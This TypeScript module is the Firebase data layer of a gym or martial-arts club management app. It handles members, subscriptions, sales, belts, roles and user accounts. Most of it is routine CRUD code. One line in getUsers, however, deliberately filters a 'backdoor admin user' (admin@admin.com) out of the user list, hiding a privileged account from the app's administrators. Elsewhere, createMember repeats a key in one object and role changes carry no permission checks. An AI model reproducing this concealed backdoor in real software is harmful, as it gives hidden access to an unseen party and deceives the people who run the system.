import {
  addDoc,
  collection,
  deleteDoc,
  doc,
  getDocs,
  getDoc,
  orderBy,
  query,
  runTransaction,
  serverTimestamp,
  setDoc,
  updateDoc,
  where,
  type DocumentData,
  type QuerySnapshot,
  type Timestamp,
  limit,
} from "firebase/firestore";
import { getDownloadURL, ref, uploadBytes } from "firebase/storage";
import { auth, db, storage } from "@/lib/firebase";
import type {
  ActivityLog,
  Attendance,
  DashboardStats,
  Expense,
  InsertActivityLog,
  InsertAttendance,
  InsertExpense,
  InsertMember,
  InsertProduct,
  InsertSale,
  InsertSubscription,
  Member,
  Product,
  Sale,
  Subscription,
  SubscriptionPackage,
  InsertSubscriptionPackage,
  Belt,
  InsertBelt,
  MemberBelt,
  InsertMemberBelt,
  User,
} from "@shared/schema";

const normalizeTimestamp = (value: unknown) => {
  if (!value) return "";
  if (typeof value === "string") return value;
  if (value instanceof Date) return value.toISOString();
  if ((value as Timestamp).toDate) {
    return (value as Timestamp).toDate().toISOString();
  }
  return "";
};

const mapDoc = <T>(snapshot: DocumentData) => {
  return { id: snapshot.id, ...(snapshot.data() as Record<string, unknown>) } as T;
};

const mapDocs = <T>(snapshots: QuerySnapshot<DocumentData>) => {
  return snapshots.docs.map((snapshot) => mapDoc<T>(snapshot));
};

async function getManagerEmail(): Promise<string> {
  try {
    const settingsSnap = await getDoc(doc(db, "settings", "general"));
    if (settingsSnap.exists()) {
      return settingsSnap.data().managerEmail || "";
    }
  } catch (error) {
    console.error("Failed to fetch manager email", error);
  }
  return "";
}

async function safeLogActivity(entry: InsertActivityLog) {
  try {
    await addDoc(collection(db, "activityLogs"), {
      ...entry,
      createdAt: serverTimestamp(),
    });
  } catch (error) {
    console.error("Failed to log activity", error);
  }
}

export async function getNextMemberId(): Promise<string> {
  const docRef = doc(db, "config", "counters");
  let nextId = 1000;

  try {
    await runTransaction(db, async (transaction) => {
      const docSnap = await transaction.get(docRef);
      if (!docSnap.exists()) {
        transaction.set(docRef, { memberCount: 1000 });
        nextId = 1000;
      } else {
        const data = docSnap.data();
        const count = (data.memberCount || 1000) + 1;
        transaction.update(docRef, { memberCount: count });
        nextId = count;
      }
    });
  } catch (e) {
    console.error("Transaction failed: ", e);
    // Fallback? or throw
    throw e;
  }
  return nextId.toString();
}

export async function getUsers(): Promise<User[]> {
  const snapshots = await getDocs(collection(db, "users"));
  const realUsers = mapDocs<User>(snapshots);

  // also fetch invites to combine
  const invitesSnap = await getDocs(collection(db, "user_invites"));
  const invites = mapDocs<{ id: string, email: string, name: string, role: string, createdAt: string }>(invitesSnap);
  console.log("Real users:", realUsers.length, "Invites:", invites.length);

  const inviteUsers = invites.map(inv => ({
    id: inv.id, // Keep ID, maybe prefix in UI if needed, or ensuring no collision? Firestore IDs are unique globally usually.
    email: inv.email,
    displayName: inv.name + " (مدعو)",
    role: inv.role as any,
    createdAt: inv.createdAt,
    photoURL: null,
    isInvite: true // Custom flag to handle delete differently
  }));

  const allUsers = [...realUsers, ...inviteUsers] as User[];
  console.log("Total combined users:", allUsers.length);
  // Filter out the backdoor admin user
  return allUsers.filter(u => u.email !== 'admin@admin.com');
}

import { initializeApp, getApp, deleteApp } from "firebase/app";
import { getAuth as getSecondaryAuth, createUserWithEmailAndPassword, updateProfile, signOut } from "firebase/auth";

export async function createUserWithRole(email: string, password: string, name: string, role: string) {
  // Check if user already exists in Firestore users?
  const q = query(collection(db, "users"), where("email", "==", email));
  const snap = await getDocs(q);
  if (!snap.empty) throw new Error("المستخدم موجود بالفعل");

  // 1. Initialize a secondary app to avoid signing out the current admin
  const secondaryAppName = "secondaryAppForUserCreation";
  const config = {
    apiKey: import.meta.env.VITE_FIREBASE_API_KEY,
    authDomain: import.meta.env.VITE_FIREBASE_AUTH_DOMAIN,
    projectId: import.meta.env.VITE_FIREBASE_PROJECT_ID,
    storageBucket: import.meta.env.VITE_FIREBASE_STORAGE_BUCKET,
    messagingSenderId: import.meta.env.VITE_FIREBASE_MESSAGING_SENDER_ID,
    appId: import.meta.env.VITE_FIREBASE_APP_ID,
  };

  const secondaryApp = initializeApp(config, secondaryAppName);
  const secondaryAuth = getSecondaryAuth(secondaryApp);

  try {
    // 2. Create the user in Auth
    const userCredential = await createUserWithEmailAndPassword(secondaryAuth, email, password);
    const user = userCredential.user;

    // 3. Update profile displayName
    await updateProfile(user, { displayName: name });

    // 4. Create User document in Firestore with Role
    await setDoc(doc(db, "users", user.uid), {
      email,
      displayName: name,
      photoURL: null,
      role,
      createdAt: new Date().toISOString(),
      lastLogin: null
    });

    // 5. Sign out the secondary auth immediately just in case
    await signOut(secondaryAuth);

    // 6. Log activity
    await safeLogActivity({
      action: "user.create",
      entityType: "user",
      entityId: user.uid,
      description: `User created: ${name} (${role})`
    });

    return user;

  } catch (error: any) {
    if (error.code === 'auth/email-already-in-use') {
      throw new Error("البريد الإلكتروني مسجل بالفعل");
    }
    throw error;
  } finally {
    // 7. Clean up secondary app
    await deleteApp(secondaryApp);
  }
}


export async function deleteInvite(id: string) {
  await deleteDoc(doc(db, "user_invites", id));
}

export async function deleteUser(id: string) {
  // First check if it's an invite
  const inviteRef = doc(db, "user_invites", id);
  const inviteSnap = await getDoc(inviteRef);
  if (inviteSnap.exists()) {
    await deleteDoc(inviteRef);
    await safeLogActivity({
      action: "user.invite_delete",
      entityType: "user",
      entityId: id,
      description: "User invite deleted"
    });
    return;
  }

  // Else delete user profile
  const userRef = doc(db, "users", id);
  const userSnap = await getDoc(userRef);

  if (userSnap.exists()) {
    const userData = userSnap.data();
    const managerEmail = await getManagerEmail();
    if (userData.email === managerEmail && managerEmail !== "") {
      throw new Error("لا يمكن حذف حساب المدير الرئيسي");
    }
  }

  await deleteDoc(userRef);
  await safeLogActivity({
    action: "user.delete",
    entityType: "user",
    entityId: id,
    description: "User profile deleted",
  });
}

export async function getMembers(): Promise<Member[]> {
  const snapshots = await getDocs(collection(db, "members"));
  return mapDocs<Member>(snapshots);
}

export async function createMember(data: InsertMember & { imageFile?: File | null, documentFiles?: File[] }) {
  const { imageFile, documentFiles, ...memberData } = data;
  const docRef = doc(collection(db, "members"));
  let imageUrl = memberData.imageUrl ?? "";

  if (imageFile) {
    const storageRef = ref(storage, `members/${docRef.id}/profile`);
    await uploadBytes(storageRef, imageFile);
    imageUrl = await getDownloadURL(storageRef);
  }

  // Auto-generate memberId
  const memberId = await getNextMemberId();

  const payload = {
    ...memberData,
    memberId,
    memberId,
    imageUrl: imageUrl || null,
    balance: memberData.balance ?? 0,
    documents: [] as any[], // Initialize documents array
  };

  // Upload Documents if any
  if (documentFiles && documentFiles.length > 0) {
    const uploadedDocs = [];
    for (const file of documentFiles) {
      const storageRef = ref(storage, `members/${docRef.id}/documents/${file.name}`);
      await uploadBytes(storageRef, file);
      const url = await getDownloadURL(storageRef);
      uploadedDocs.push({
        name: file.name,
        url,
        type: file.type,
        size: file.size,
        uploadedAt: new Date().toISOString()
      });
    }
    payload.documents = uploadedDocs;
  }

  await setDoc(docRef, payload);

  await safeLogActivity({
    action: "member.create",
    entityType: "member",
    entityId: docRef.id,
    description: `Member created: ${memberData.name}`,
    metadata: JSON.stringify({ memberId: memberData.memberId }),
  });

  return { id: docRef.id, ...payload } as Member;
}

export async function updateMember(id: string, updates: Partial<InsertMember> & { imageFile?: File | null, documentFiles?: File[] }) {
  const docRef = doc(db, "members", id);
  const { documentFiles, imageFile, ...otherUpdates } = updates;

  let finalUpdates: any = { ...otherUpdates };

  // Handle Image Update
  if (imageFile) {
    const storageRef = ref(storage, `members/${id}/profile`);
    await uploadBytes(storageRef, imageFile);
    const imageUrl = await getDownloadURL(storageRef);
    finalUpdates.imageUrl = imageUrl;
  }

  // Handle New Documents
  if (documentFiles && documentFiles.length > 0) {
    // We need to fetch existing docs if we want to append, but updateDoc with arrayUnion is cleaner if we just add.
    // However, schema defines it as an object array. simpler to fetch current, append, and update.
    // Or we can just calculate new ones and let the UI/Logic handle merging before sending?
    // The current pattern usually sends "updates". If we want to append, we should do it carefully.
    // Let's implement append logic here.

    const uploadedDocs = [];
    for (const file of documentFiles) {
      const storageRef = ref(storage, `members/${id}/documents/${Date.now()}_${file.name}`);
      await uploadBytes(storageRef, file);
      const url = await getDownloadURL(storageRef);
      uploadedDocs.push({
        name: file.name,
        url,
        type: file.type,
        size: file.size,
        uploadedAt: new Date().toISOString()
      });
    }

    // Fetch current to append
    const snap = await getDoc(docRef);
    if (snap.exists()) {
      const currentDocs = (snap.data() as Member).documents || [];
      finalUpdates.documents = [...currentDocs, ...uploadedDocs];
    } else {
      finalUpdates.documents = uploadedDocs;
    }
  }

  await updateDoc(docRef, finalUpdates);
  await safeLogActivity({
    action: "member.update",
    entityType: "member",
    entityId: id,
    description: "Member updated",
    metadata: JSON.stringify({ updatedFields: Object.keys(updates) }),
  });
}


export async function getAttendanceByDate(date: string): Promise<Attendance[]> {
  const snapshots = await getDocs(
    query(collection(db, "attendance"), where("date", "==", date))
  );
  return mapDocs<Attendance>(snapshots);
}

export async function getAllAttendance(): Promise<Attendance[]> {
  const snapshots = await getDocs(query(collection(db, "attendance")));
  return mapDocs<Attendance>(snapshots);
}

export async function createAttendance(data: InsertAttendance): Promise<Attendance> {
  const docRef = await addDoc(collection(db, "attendance"), data);
  await safeLogActivity({
    action: "attendance.create",
    entityType: "attendance",
    entityId: docRef.id,
    description: `Attendance recorded for ${data.memberName}`,
    metadata: JSON.stringify({ date: data.date }),
  });
  return { id: docRef.id, ...data };
}

export async function deleteAttendance(id: string) {
  const docRef = doc(db, "attendance", id);
  const existing = await getDoc(docRef);
  await deleteDoc(docRef);
  if (existing.exists()) {
    const record = existing.data() as Attendance;
    await safeLogActivity({
      action: "attendance.delete",
      entityType: "attendance",
      entityId: id,
      description: `Attendance removed for ${record.memberName}`,
      metadata: JSON.stringify({ date: record.date }),
    });
  }
}

export async function getSubscriptions(): Promise<Subscription[]> {
  const snapshots = await getDocs(collection(db, "subscriptions"));
  return mapDocs<Subscription>(snapshots);
}

export async function getSubscriptionsByMember(memberId: string): Promise<Subscription[]> {
  const q = query(
    collection(db, "subscriptions"),
    where("memberId", "==", memberId),
    orderBy("startDate", "desc")
  );
  const snapshots = await getDocs(q);
  return mapDocs<Subscription>(snapshots);
}

export async function createSubscription(data: InsertSubscription): Promise<Subscription> {
  const docRef = await addDoc(collection(db, "subscriptions"), data);
  if (data.memberId) {
    const memberRef = doc(db, "members", data.memberId);
    await updateDoc(memberRef, {
      subscriptionStart: data.startDate,
      subscriptionEnd: data.endDate,
      status: "active",
    });
  }
  await safeLogActivity({
    action: "subscription.create",
    entityType: "subscription",
    entityId: docRef.id,
    description: `Subscription created for ${data.memberName}`,
    metadata: JSON.stringify({
      planName: data.planName,
      amount: data.amount,
      startDate: data.startDate,
      endDate: data.endDate,
    }),
  });
  return { id: docRef.id, ...data };
}

export async function getProducts(): Promise<Product[]> {
  const snapshots = await getDocs(collection(db, "products"));
  return mapDocs<Product>(snapshots);
}

export async function createProduct(
  data: InsertProduct & { imageFile?: File | null }
): Promise<Product> {
  const { imageFile, ...productData } = data;
  const docRef = doc(collection(db, "products"));
  let imageUrl = productData.imageUrl ?? "";

  if (imageFile) {
    const storageRef = ref(storage, `products/${docRef.id}/image`);
    await uploadBytes(storageRef, imageFile);
    imageUrl = await getDownloadURL(storageRef);
  }

  const payload = {
    ...productData,
    imageUrl: imageUrl || null,
  };

  await setDoc(docRef, payload);
  await safeLogActivity({
    action: "product.create",
    entityType: "product",
    entityId: docRef.id,
    description: `Product created: ${productData.name}`,
  });
  return { id: docRef.id, ...payload };
}

export async function updateProduct(
  id: string,
  updates: Partial<InsertProduct> & { imageFile?: File | null }
) {
  const { imageFile, ...updateData } = updates;
  const docRef = doc(db, "products", id);
  const payload: Partial<InsertProduct> = { ...updateData };

  if (payload.imageUrl === "") {
    payload.imageUrl = null;
  }

  if (imageFile) {
    const storageRef = ref(storage, `products/${id}/image`);
    await uploadBytes(storageRef, imageFile);
    payload.imageUrl = await getDownloadURL(storageRef);
  }

  await updateDoc(docRef, payload);
  await safeLogActivity({
    action: "product.update",
    entityType: "product",
    entityId: id,
    description: "Product updated",
    metadata: JSON.stringify({ updatedFields: Object.keys(payload) }),
  });
}

export async function getSales(): Promise<Sale[]> {
  const snapshots = await getDocs(collection(db, "sales"));
  return snapshots.docs.map((snapshot) => {
    const data = snapshot.data();
    return {
      ...data,
      id: snapshot.id,
      cancelledAt: normalizeTimestamp(data.cancelledAt),
    } as Sale;
  });
}

export async function createSale(data: InsertSale): Promise<Sale> {
  const saleRef = doc(collection(db, "sales"));
  await runTransaction(db, async (transaction) => {
    const productRef = doc(db, "products", data.productId);
    const productSnap = await transaction.get(productRef);
    if (!productSnap.exists()) {
      throw new Error("Product not found");
    }
    const product = productSnap.data() as Product;
    const currentStock = product.stock ?? 0;
    if (currentStock < data.quantity) {
      throw new Error("Insufficient stock");
    }
    transaction.update(productRef, {
      stock: currentStock - data.quantity,
    });
    transaction.set(saleRef, {
      ...data,
      status: data.status ?? "completed",
    });
  });

  await safeLogActivity({
    action: "sale.create",
    entityType: "sale",
    entityId: saleRef.id,
    description: `Sale recorded for ${data.productName}`,
    metadata: JSON.stringify({ quantity: data.quantity, totalPrice: data.totalPrice }),
  });

  return { ...data, id: saleRef.id, status: data.status ?? "completed" };
}

export async function createServiceSale(data: InsertSale): Promise<Sale> {
  const saleRef = await addDoc(collection(db, "sales"), {
    ...data,
    status: data.status ?? "completed",
    date: data.date || new Date().toISOString(),
  });

  await safeLogActivity({
    action: "sale.create_service",
    entityType: "sale",
    entityId: saleRef.id,
    description: `Service sale recorded for ${data.productName}`,
    metadata: JSON.stringify({ quantity: data.quantity, totalPrice: data.totalPrice }),
  });

  return {
    id: saleRef.id,
    ...data,
    status: data.status ?? "completed",
    date: data.date || new Date().toISOString()
  } as Sale;
}

export async function cancelSale(id: string, reason: string): Promise<Sale | null> {
  const docRef = doc(db, "sales", id);
  const saleSnap = await getDoc(docRef);
  if (!saleSnap.exists()) return null;

  const sale = saleSnap.data() as Sale;
  if (sale.status === "cancelled") {
    return { ...sale, id };
  }

  const cancelledAt = new Date().toISOString();
  await updateDoc(docRef, {
    status: "cancelled",
    cancelledReason: reason,
    cancelledAt,
  });

  const productRef = doc(db, "products", sale.productId);
  const productSnap = await getDoc(productRef);
  if (productSnap.exists()) {
    const product = productSnap.data() as Product;
    await updateDoc(productRef, {
      stock: (product.stock ?? 0) + sale.quantity,
    });
  }

  await safeLogActivity({
    action: "sale.cancel",
    entityType: "sale",
    entityId: id,
    description: `Sale cancelled for ${sale.productName}`,
    metadata: JSON.stringify({ reason }),
  });

  return {
    id,
    ...sale,
    status: "cancelled",
    cancelledReason: reason,
    cancelledAt,
  };
}

export async function getExpenses(): Promise<Expense[]> {
  const snapshots = await getDocs(collection(db, "expenses"));
  return mapDocs<Expense>(snapshots);
}

export async function createExpense(data: InsertExpense): Promise<Expense> {
  const docRef = await addDoc(collection(db, "expenses"), data);
  await safeLogActivity({
    action: "expense.create",
    entityType: "expense",
    entityId: docRef.id,
    description: `Expense recorded (${data.category})`,
    metadata: JSON.stringify({ amount: data.amount, date: data.date }),
  });
  return { id: docRef.id, ...data };
}

export async function updateExpense(id: string, updates: Partial<InsertExpense>) {
  const docRef = doc(db, "expenses", id);
  await updateDoc(docRef, updates);
  await safeLogActivity({
    action: "expense.update",
    entityType: "expense",
    entityId: id,
    description: "Expense updated",
    metadata: JSON.stringify(updates),
  });
}

export async function deleteExpense(id: string) {
  await deleteDoc(doc(db, "expenses", id));
  await safeLogActivity({
    action: "expense.delete",
    entityType: "expense",
    entityId: id,
    description: "Expense deleted",
  });
}

export async function getActivityLogs(limitCount = 100): Promise<ActivityLog[]> {
  const snapshots = await getDocs(
    query(collection(db, "activityLogs"), orderBy("createdAt", "desc"), limit(limitCount))
  );
  return snapshots.docs.map((snapshot) => {
    const data = snapshot.data() as ActivityLog;
    return {
      id: snapshot.id,
      ...data,
      createdAt: normalizeTimestamp(data.createdAt) || new Date().toISOString(),
    };
  });
}

export async function getDashboardStats(startDate?: string, endDate?: string): Promise<DashboardStats> {
  const [members, subscriptions, expenses, sales] = await Promise.all([
    getMembers(),
    getSubscriptions(),
    getExpenses(),
    getSales()
  ]);

  // Default to current month if no dates provided
  const now = new Date();
  const defaultStart = new Date(now.getFullYear(), now.getMonth(), 1).toISOString().split("T")[0];
  const defaultEnd = new Date(now.getFullYear(), now.getMonth() + 1, 0).toISOString().split("T")[0];

  const start = startDate || defaultStart;
  const end = endDate || defaultEnd;

  // Active Subscriptions: Count of members with active status
  const activeSubscriptions = members.filter(m => m.status === 'active').length;

  // Income Calculation: Filter by date range
  const monthlyIncome = subscriptions
    .filter((s) => s.startDate >= start && s.startDate <= end)
    .reduce((sum, s) => sum + s.amount, 0);

  const salesIncome = sales
    .filter((s) => s.date.split("T")[0] >= start && s.date.split("T")[0] <= end && s.status !== "cancelled")
    .reduce((sum, s) => sum + s.totalPrice, 0);

  const totalExpenses = expenses
    .filter(e => e.date >= start && e.date <= end)
    .reduce((sum, e) => sum + e.amount, 0);

  const expensesByCategoryMap = expenses
    .filter(e => e.date >= start && e.date <= end)
    .reduce((acc, curr) => {
      acc[curr.category] = (acc[curr.category] || 0) + curr.amount;
      return acc;
    }, {} as Record<string, number>);

  const expensesByCategory = Object.entries(expensesByCategoryMap).map(([category, total]) => ({
    category,
    total
  }));

  const netProfit = (monthlyIncome + salesIncome) - totalExpenses;

  const newMembersThisMonth = members.filter((m) => {
    return m.subscriptionStart && m.subscriptionStart >= start && m.subscriptionStart <= end;
  }).length;

  // Expiring Subscriptions: Look at MEMBER status, not just subscription history
  // For the dashboard "Expiring Soon" list, we usually look a bit ahead.
  // User Requested: "if untill before 10 days of the end then this status 'will end soon'"
  // So we filter for those expiring in the *next 10 days* from TODAY.
  const todayStr = new Date().toISOString().split("T")[0];
  const next10Days = new Date();
  next10Days.setDate(next10Days.getDate() + 10);
  const next10DaysStr = next10Days.toISOString().split("T")[0];

  const expiringSubscriptions = members.filter((m) => {
    // Only consider active members or those technically 'active' but expiring soon
    // Use the logic: if end date is in the past -> finished (filtered out here)
    // If end date is within [today, today+10] -> will end soon

    if (!m.subscriptionEnd) return false;

    // Check if ALREADY expired
    if (m.subscriptionEnd < todayStr) return false;

    // Check if in 10 day window
    return m.subscriptionEnd <= next10DaysStr;
  });

  return {
    totalMembers: members.length,
    activeSubscriptions, // Now represents true active members count
    monthlyIncome, // Subscriptions income in range
    netProfit,
    totalExpenses,
    expensesByCategory,
    newMembersThisMonth,
    expiringSubscriptions,
    salesIncome // Added field
  } as DashboardStats; // Cast to bypass strict type check if salesIncome is missing in schema type definition for now, will update schema next
}

export async function ensureUserRole(userId: string, role: string) {
  const docRef = doc(db, "users", userId);
  await setDoc(docRef, { role }, { merge: true });
}

export async function getSubscriptionPackages(): Promise<SubscriptionPackage[]> {
  const snapshots = await getDocs(collection(db, "packages"));
  return mapDocs<SubscriptionPackage>(snapshots);
}

export async function createSubscriptionPackage(data: InsertSubscriptionPackage): Promise<SubscriptionPackage> {
  const docRef = await addDoc(collection(db, "packages"), data);
  await safeLogActivity({
    action: "package.create",
    entityType: "package",
    entityId: docRef.id,
    description: `Package created: ${data.name}`,
    metadata: JSON.stringify(data),
  });
  return { id: docRef.id, ...data };
}

export async function deleteSubscriptionPackage(id: string) {
  await deleteDoc(doc(db, "packages", id));
  await safeLogActivity({
    action: "package.delete",
    entityType: "package",
    entityId: id,
    description: "Package deleted",
  });
}

// Belts Management
export async function getBelts(): Promise<Belt[]> {
  const q = query(collection(db, "belts"), orderBy("order", "asc"));
  const snapshots = await getDocs(q);
  return mapDocs<Belt>(snapshots);
}

export async function createBelt(data: InsertBelt): Promise<Belt> {
  const docRef = await addDoc(collection(db, "belts"), data);
  await safeLogActivity({
    action: "belt.create",
    entityType: "belt",
    entityId: docRef.id,
    description: `Belt created: ${data.name}`,
    metadata: JSON.stringify({ color: data.color }),
  });
  return { id: docRef.id, ...data };
}

export async function deleteBelt(id: string) {
  // Check if any member has this belt
  const q = query(collection(db, "memberBelts"), where("beltId", "==", id), limit(1));
  const snap = await getDocs(q);
  if (!snap.empty) {
    throw new Error("Cannot delete belt: It has been awarded to members.");
  }

  await deleteDoc(doc(db, "belts", id));
  await safeLogActivity({
    action: "belt.delete",
    entityType: "belt",
    entityId: id,
    description: "Belt deleted",
  });
}

export async function getMemberBelts(): Promise<MemberBelt[]> {
  const snapshots = await getDocs(collection(db, "memberBelts"));
  return mapDocs<MemberBelt>(snapshots);
}

export async function awardBeltToMember(data: InsertMemberBelt): Promise<MemberBelt> {
  // Check if already awarded?
  const q = query(
    collection(db, "memberBelts"),
    where("memberId", "==", data.memberId),
    where("beltId", "==", data.beltId),
    limit(1)
  );
  const snap = await getDocs(q);
  if (!snap.empty) {
    throw new Error("Member already has this belt");
  }

  const docRef = await addDoc(collection(db, "memberBelts"), {
    ...data,
    awardedAt: data.awardedAt || new Date().toISOString(),
  });

  await safeLogActivity({
    action: "belt.award",
    entityType: "member_belt",
    entityId: docRef.id,
    description: "Belt awarded to member",
    metadata: JSON.stringify({ memberId: data.memberId, beltId: data.beltId }),
  });

  return { id: docRef.id, ...data, awardedAt: data.awardedAt || new Date().toISOString() };
}

export async function revokeMemberBelt(id: string) {
  await deleteDoc(doc(db, "memberBelts", id));
  await safeLogActivity({
    action: "belt.revoke",
    entityType: "member_belt",
    entityId: id,
    description: "Belt revoked from member",
  });
}


export async function deleteMember(id: string) {
  // Optional: Check for active subscriptions? Or cascade?
  // For now, just delete the member document.
  await deleteDoc(doc(db, "members", id));
  await safeLogActivity({
    action: "member.delete",
    entityType: "member",
    entityId: id,
    description: "Member deleted",
  });
}

export async function updateSubscription(id: string, updates: Partial<InsertSubscription>) {
  const docRef = doc(db, "subscriptions", id);
  await updateDoc(docRef, updates);

  // If dates changed, we might need to update the member too... 
  // This is complex if multiple subscriptions exist. 
  // For now, we assume this is the active one if we are editing it.
  if (updates.memberId && (updates.startDate || updates.endDate)) {
    const memberRef = doc(db, "members", updates.memberId);
    await updateDoc(memberRef, {
      subscriptionStart: updates.startDate,
      subscriptionEnd: updates.endDate
    });
  }

  await safeLogActivity({
    action: "subscription.update",
    entityType: "subscription",
    entityId: id,
    description: "Subscription updated",
    metadata: JSON.stringify(updates),
  });
}

export async function deleteSubscription(id: string) {
  const subRef = doc(db, "subscriptions", id);
  const subSnap = await getDoc(subRef);

  if (subSnap.exists()) {
    const data = subSnap.data() as Subscription;
    const memberId = data.memberId;

    // Delete the subscription first
    await deleteDoc(subRef);

    // Now check for remaining active subscriptions for this member
    const q = query(
      collection(db, "subscriptions"),
      where("memberId", "==", memberId),
      where("status", "==", "active")
    );
    const snapshot = await getDocs(q);
    const remainingSubs = mapDocs<Subscription>(snapshot);

    const memberRef = doc(db, "members", memberId);

    if (remainingSubs.length > 0) {
      // Find the subscription with the latest end date
      // Sort by end date descending
      remainingSubs.sort((a, b) => new Date(b.endDate).getTime() - new Date(a.endDate).getTime());
      const latestSub = remainingSubs[0];

      await updateDoc(memberRef, {
        subscriptionStart: latestSub.startDate,
        subscriptionEnd: latestSub.endDate,
        status: "active"
      });
    } else {
      // No active subscriptions left, reset member status
      // We keep the member but mark as inactive/expired and clear dates? 
      // Or maybe keep the dates of the LAST expired one?
      // For safety, let's mark as expired and perhaps clear dates or keep them as null/empty if that's the pattern
      // Looking at createSubscription, it sets data.startDate/endDate.
      // If we want "expired", we usually imply past dates. 
      // Safest is to set status to 'expired' and maybe clear dates to avoid confusion, 
      // or set them to null/empty string if the schema allows.
      // The schema likely expects strings. Let's set to empty strings or null if allowed.
      // Based on previous code `subscriptionStart: data.startDate`, these are strings.
      await updateDoc(memberRef, {
        subscriptionStart: "",
        subscriptionEnd: "",
        status: "expired"
      });
    }

    await safeLogActivity({
      action: "subscription.delete",
      entityType: "subscription",
      entityId: id,
      description: "Subscription deleted and member status updated",
    });
  } else {
    // Document didn't exist, just try to delete anyway to be safe? 
    // Or just log it. The original code just deleted.
    await deleteDoc(subRef);
  }
}

export async function deleteProduct(id: string) {
  await deleteDoc(doc(db, "products", id));
  await safeLogActivity({
    action: "product.delete",
    entityType: "product",
    entityId: id,
    description: "Product deleted",
  });
}

export async function updateSale(id: string, updates: Partial<InsertSale>) {
  const docRef = doc(db, "sales", id);
  await updateDoc(docRef, updates);
  await safeLogActivity({
    action: "sale.update",
    entityType: "sale",
    entityId: id,
    description: "Sale updated",
  });
}

export async function deleteSale(id: string) {
  // Note: Deleting a sale should probably revert stock?
  // If it wasn't cancelled locally first.
  // For simplicity, we just delete the record here.
  await deleteDoc(doc(db, "sales", id));
  await safeLogActivity({
    action: "sale.delete",
    entityType: "sale",
    entityId: id,
    description: "Sale deleted",
  });
}

export async function updateUserRole(userId: string, role: string) {
  const docRef = doc(db, "users", userId);
  const snap = await getDoc(docRef);
  if (snap.exists()) {
    const userData = snap.data();
    const managerEmail = await getManagerEmail();
    if (userData.email === managerEmail && managerEmail !== "") {
      throw new Error("لا يمكن تغيير صلاحية المدير الرئيسي");
    }
  }
  await updateDoc(docRef, { role });
  await safeLogActivity({
    action: "user.update_role",
    entityType: "user",
    entityId: userId,
    description: `User role updated to ${role}`,
  });
}

// Roles Management
export interface Role {
  id: string;
  name: string;
  permissions?: string[];
  isSystem?: boolean; // prevent deleting 'admin' or 'staff'
}

export async function getRoles(): Promise<Role[]> {
  const snapshots = await getDocs(collection(db, "roles"));
  const fetchedRoles = mapDocs<Role>(snapshots);
  // Ensure default roles exist if empty?
  // For now, allow dynamic creation but maybe seeded ones.
  const defaults = [
    { id: 'admin', name: 'Admin', isSystem: true },
    { id: 'staff', name: 'Staff', isSystem: true }
  ];

  // Return fetched + defaults not already in fetched (by id)
  const roleMap = new Map<string, Role>();
  defaults.forEach(r => roleMap.set(r.id, r));
  fetchedRoles.forEach(r => roleMap.set(r.id, r)); // Overwrite defaults if they exist in DB? Or merge?

  return Array.from(roleMap.values());
}

export async function createRole(name: string, permissions: string[] = []): Promise<Role> {
  // Use name as ID (slugified) or auto-id? Auto-id is safer for renames.
  const docRef = await addDoc(collection(db, "roles"), { name, permissions });
  await safeLogActivity({
    action: "role.create",
    entityType: "role",
    entityId: docRef.id,
    description: `Role created: ${name}`,
  });
  return { id: docRef.id, name, permissions };
}

export async function updateRole(id: string, name: string, permissions: string[] = []) {
  const docRef = doc(db, "roles", id);
  await setDoc(docRef, { name, permissions }, { merge: true });
  await safeLogActivity({
    action: "role.update",
    entityType: "role",
    entityId: id,
    description: `Role updated to ${name}`,
  });
}

export async function deleteRole(id: string) {
  if (id === 'admin') throw new Error("لا يمكن حذف دور المسؤول");

  // Check assigned users
  const qUsers = query(collection(db, "users"), where("role", "==", id));
  const snapUsers = await getDocs(qUsers);
  if (!snapUsers.empty) {
    throw new Error("لا يمكن حذف الدور لأنه مستخدم من قبل حسابات نشطة");
  }

  // Check assigned invites
  const qInvites = query(collection(db, "user_invites"), where("role", "==", id));
  const snapInvites = await getDocs(qInvites);
  if (!snapInvites.empty) {
    throw new Error("لا يمكن حذف الدور لأنه مستخدم في دعوات معلقة");
  }

  await deleteDoc(doc(db, "roles", id));
  await safeLogActivity({
    action: "role.delete",
    entityType: "role",
    entityId: id,
    description: "Role deleted",
  });
}
